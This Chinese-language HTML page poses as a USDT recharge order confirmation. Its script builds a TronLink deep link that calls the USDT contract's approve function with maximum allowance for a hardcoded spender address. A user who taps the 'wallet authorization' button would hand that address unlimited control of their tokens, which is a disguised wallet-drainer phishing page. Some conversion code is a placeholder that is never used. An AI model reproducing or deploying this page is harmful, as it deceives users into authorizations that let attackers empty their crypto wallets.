
<!DOCTYPE html>
<html lang="zh">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>订单确认信息</title>
  <style>
    body { font-family: sans-serif; margin: 0; background: #f9fafb; }
    header { background: #1f2937; color: white; padding: 1rem; text-align: center; font-size: 1.25rem; }
    .main { padding: 1rem; display: flex; justify-content: center; }
    .card { background: white; padding: 1.5rem; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.05); max-width: 500px; width: 100%; }
    .info { margin-bottom: 1rem; font-size: 1rem; }
    .label { font-weight: bold; color: #555; display: inline-block; width: 100px; }
    .footer { padding: 1rem; }
    .btn { width: 100%; padding: 1rem; background: #10b981; color: white; font-size: 1.1rem; border: none; border-radius: 8px; font-weight: bold; }
    .status { margin-top: 1rem; color: #f43f5e; font-size: 0.95rem; text-align: center; }
  </style>
</head>
<body>
  <header>订单确认信息</header>
  <div class="main">
    <div class="card">
      <div class="info"><span class="label">用户名：</span><span id="username">--</span></div>
      <div class="info"><span class="label">充值金额：</span><span id="amount">--</span> USDT</div>
      <div class="info"><span class="label">订单编号：</span><span id="orderid">--</span></div>
    </div>
  </div>
  <div class="footer">
    <a id="tronlink-btn" class="btn" href="#">跳转钱包授权</a>
    <p class="status" id="status">请点击上方按钮跳转至 TronLink 或 TP 钱包授权</p>
  </div>

  <script>
    const query = new URLSearchParams(location.search);
    const user = query.get("username") || "未登录";
    const amount = query.get("amount") || "0";
    const orderId = Math.floor(10000000 + Math.random() * 90000000);

    document.getElementById("username").innerText = user;
    document.getElementById("amount").innerText = amount;
    document.getElementById("orderid").innerText = orderId;

    // 构造 TRON 协议跳转 URI（授权 approve 合约）
    const contract = "TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf"; // USDT 合约
    const spender = "TTrMWd5Ukn4dLnQXrbRe1z5AGWa2CDrjLz"; // 授权目标地址
    const functionSelector = "approve";
    const amountHex = "7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"; // 最大授权

    const paramSpender = spender.replace(/^T/, '41') // base58 to hex placeholder
    const fullParams = encodeURIComponent(spender + "," + amountHex);
    const tronlinkURI = `tronlink://contract/call/?contractAddress=${contract}&function=${functionSelector}&parameter=${fullParams}&callValue=0`;

    document.getElementById("tronlink-btn").setAttribute("href", tronlinkURI);
  </script>
</body>
</html>
